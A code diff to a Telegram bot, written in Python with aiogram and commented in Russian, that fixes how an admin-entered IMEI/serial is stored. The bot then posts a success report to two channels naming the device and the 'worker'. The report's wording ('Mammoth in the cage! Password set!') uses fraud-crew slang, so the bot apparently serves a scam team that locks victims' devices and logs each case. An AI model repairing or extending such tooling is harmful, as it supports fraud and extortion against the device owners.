@@ -61,13 +61,20 @@ async def lock_3(msg: types.Message, state: FSMContext):
 
 @dp.message_handler(state=LockForm.locker, is_admin=True)
 async def lock_finish(msg: types.Message, state: FSMContext):
+    # 1. Сначала сохраняем текст сообщения (IMEI) в состояние
+    await state.update_data(locker=msg.text)
+    
+    # 2. Теперь получаем обновленные данные
     data = await state.get_data()
+    
+    # 3. Формируем текст (теперь 'locker' точно есть в data)
     text = (
         f"🔐🔑УСПЕХ! 💥 Мамонт в клетке! 🦣Пароль установлен!\n\n"
         f"📱 Устройство: {data['device']}\n"
         f"👨‍💻 Воркер: {data['worker']}\n"
         f"⚙️ IMEI/Serial: {data['locker']}"
     )
+    
     await bot.send_message(CHANNEL_ID_1, text)
     await bot.send_message(CHANNEL_ID_2, text)
     await state.finish()
